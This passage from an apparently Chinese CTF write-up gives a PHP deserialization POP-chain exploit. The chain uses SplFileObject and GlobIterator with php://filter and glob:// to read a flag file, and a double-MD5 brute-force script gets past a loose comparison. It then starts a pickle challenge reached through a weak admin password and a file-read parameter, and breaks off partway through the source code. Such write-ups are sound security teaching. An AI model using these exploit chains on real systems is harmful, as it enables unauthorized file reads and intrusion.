    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$var</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Warlord</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$fruit4</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit5</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$arg1</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit4</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit5</span><span class="token operator">-&gt;</span><span class="token function">ll2</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'b2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Samurai</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$fruit6</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit7</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$long</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit6</span><span class="token operator">-&gt;</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$long</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit7</span><span class="token operator">-&gt;</span><span class="token property">tt2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"xxx are the best!!!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">//自己手动加</span>
    <span class="token keyword">public</span> <span class="token variable">$SplFileObject</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=/flag"</span><span class="token punctuation">;</span>
	<span class="token comment">//$day2对象的属性名, $day1是对象的属性值</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">,</span> <span class="token variable">$day2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$day3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$day2</span><span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//利用SplFileObject读取文件</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$day3</span> <span class="token keyword">as</span> <span class="token variable">$day4</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$day4</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Princess</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">protected</span> <span class="token variable">$fruit9</span><span class="token punctuation">;</span>

    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">addMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"The time spent with xxx is my happiest time"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit9</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$func</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"Me"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Philosopher</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$fruit10</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit11</span><span class="token operator">=</span><span class="token string double-quoted-string">"sr22kaDugamdwTPhG5zU"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit11</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">666</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token comment">//需要绕过, 弱比较, 所以需要找到md5值开头是666后接字母的表达, 写一个脚本跑一下可以找到很多 比如"7000120353"</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit10</span><span class="token operator">-&gt;</span><span class="token property">hey</span><span class="token punctuation">;</span> <span class="token comment">//hey是不存在的属性,找__get 有三个类里面有这个方法, Mystery, Warlord, Forbidden</span>
        <span class="token punctuation">}</span>                               <span class="token comment">//使用Mystery  1.3 $fruit10=new Mystery</span>
    <span class="token punctuation">}</span>                                   
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">UselessTwo</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$hiddenVar</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123123"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hiddenVar</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hiddenVar</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Warrior</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$fruit12</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$fruit13</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit13</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"xxx"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">UselessThree</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$dummyVar</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


<span class="token keyword">class</span> <span class="token class-name-definition class-name">UselessFour</span> <span class="token punctuation">{<!-- --></span>
     <span class="token keyword">public</span> <span class="token variable">$lalala</span><span class="token punctuation">;</span>

     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hehe"</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'GHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'GHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>



<span class="token comment">//利用点: 1.Mystery里面的array_walk函数</span>
<span class="token comment">//2. Princess类里面的call_user_func函数</span>


<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Philosopher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token operator">-&gt;</span><span class="token property">fruit11</span><span class="token operator">=</span><span class="token number">7000120353</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token operator">-&gt;</span><span class="token property">fruit10</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Mystery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <p>
     最后就是要利用php的原生类进行读取目录以及读取文件
     <br/>
     <code>
      GlobIterator
     </code>
     配合
     <code>
      glob://
     </code>
     协议读取根目录
     <br/>
     <code>
      SplFileObject
     </code>
     配合php伪协议读取文件
    </p>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CherryBlossom</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$fruit1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit2</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token punctuation">;</span> <span class="token comment">//找toString,有三个类存在这个方法 CherryBlossom, UselessTwo, Samurai</span>
        <span class="token comment">//1.1 $fruit1=new CherryBlossom</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$newFunc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$newFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//找invoke, 1.2 $fruit2= new Philosopher</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">//自己手动加</span>
<span class="token comment">//    public $SplFileObject = "php://filter/read=convert.base64-encode/resource=flag.php";</span>
    <span class="token keyword">public</span> <span class="token variable">$GlobIterator</span><span class="token operator">=</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">,</span> <span class="token variable">$day2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$day3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$day2</span><span class="token punctuation">(</span><span class="token variable">$day1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//利用SplFileObject读取文件</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$day3</span> <span class="token keyword">as</span> <span class="token variable">$day4</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$day4</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


<span class="token keyword">class</span> <span class="token class-name-definition class-name">Philosopher</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$fruit10</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fruit11</span><span class="token operator">=</span><span class="token string double-quoted-string">"sr22kaDugamdwTPhG5zU"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit11</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">666</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token comment">//需要绕过, 若比较, 所以需要找到md5值开头是666后接字母的表达 "7000120353"</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit10</span><span class="token operator">-&gt;</span><span class="token property">hey</span><span class="token punctuation">;</span> <span class="token comment">//hey是不存在的属性,找__get 有三个类里面有这个方法, Mystery, Warlord, Forbidden</span>
        <span class="token punctuation">}</span>                               <span class="token comment">//使用Mystery  1.3 $fruit10=new Mystery</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">//利用点: Mystery里面的array_walk函数</span>


<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Philosopher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token operator">-&gt;</span><span class="token property">fruit11</span><span class="token operator">=</span><span class="token number">7000120353</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token operator">-&gt;</span><span class="token property">fruit10</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Mystery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/40a977bbf08b4cd3bd90fc6ae8c8bd4c.png">
      <br/>
      <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/09aacd0c8e354cd2b949dea2c6a59041.png"/>
     </img>
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/87a7e0baa0974adf8dcb0f5ae0b72e1c.png"/>
    </p>
    <p>
     md5爆破的脚本
    </p>
    <pre><code class="prism language-python"><span class="token comment"># @Author   ：wi1shu</span>


<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> threading

total <span class="token operator">=</span> <span class="token number">100000000000</span>  <span class="token comment"># 从1到多少</span>
threads <span class="token operator">=</span> <span class="token number">100</span>  <span class="token comment"># 线程数</span>
truncation <span class="token operator">=</span> <span class="token string">"666"</span>  <span class="token comment"># 被截断的值</span>
positions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>  <span class="token comment"># 截断位置</span>
per_thread <span class="token operator">=</span> total <span class="token operator">//</span> threads
threads_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">double_md5</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    first_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    second_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>first_hash<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> second_hash

<span class="token keyword">def</span> <span class="token function">calculate_md5</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>
        md5 <span class="token operator">=</span> double_md5<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">if</span> md5<span class="token punctuation">[</span>positions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>positions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> truncation<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>truncation<span class="token punctuation">}</span></span><span class="token string"> -&gt; </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>md5<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span><span class="token punctuation">:</span>
        start <span class="token operator">=</span> i <span class="token operator">*</span> per_thread <span class="token operator">+</span> <span class="token number">1</span>
        end <span class="token operator">=</span> start <span class="token operator">+</span> per_thread
        <span class="token keyword">if</span> i <span class="token operator">==</span> threads <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
            end <span class="token operator">=</span> total <span class="token operator">+</span> <span class="token number">1</span>
        thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>calculate_md5<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">)</span>
        threads_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span>
        thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> thread <span class="token keyword">in</span> threads_list<span class="token punctuation">:</span>
        thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"finished."</span><span class="token punctuation">)</span>
</code></pre>
    <h3>
     <a id="ezzzz_pickle_558">
     </a>
     ezzzz_pickle
    </h3>
    <p>
     一个登录框, admin / admin123 弱口令进入
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/5694c3049dfd45779913f93ee6d5ab39.png"/>
    </p>
    <p>
     点击读取flag, 抓包, 可以看到一个
     <code>
      filename
     </code>
     参数
    </p>
    <p>
     <img alt=" " src="https://i-blog.csdnimg.cn/direct/5e75c931a68d45cd9ece781abcc6ea48.png"/>
    </p>
    <p>
     可以读取文件
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/6be7573e9d7446728585bdc377f671a2.png"/>
    </p>
    <p>
     感觉这个读取文件的全都可以用前面发现的非预期了
     <br/>
     读取这个文件
     <code>
      docker-entrypoint.sh
     </code>
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/b2c27279c0534cdaa8644096b174b799.png"/>
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/54aef9178a664b9f95fa5598953c4246.png"/>
    </p>
    <p>
     不过还是要尝试预期做法, 读一下源码
    </p>
    <pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> render_template
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>ciphers <span class="token keyword">import</span> Cipher<span class="token punctuation">,</span> algorithms<span class="token punctuation">,</span> modes
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> padding
<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> time
<span class="token keyword">import</span> os

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">generate_key_iv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_key'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    iv <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_iv'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> key<span class="token punctuation">,</span> iv

<span class="token keyword">def</span> <span class="token function">aes_encrypt_decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'encrypt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    cipher <span class="token operator">=</span> Cipher<span class="token punctuation">(</span>algorithms<span class="token punctuation">.</span>AES<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> modes<span class="token punctuation">.</span>CBC<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">,</span> backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">'encrypt'</span><span class="token punctuation">:</span>
        encryptor <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encryptor<span class="token punctuation">(</span><span class="token punctuation">)</span>
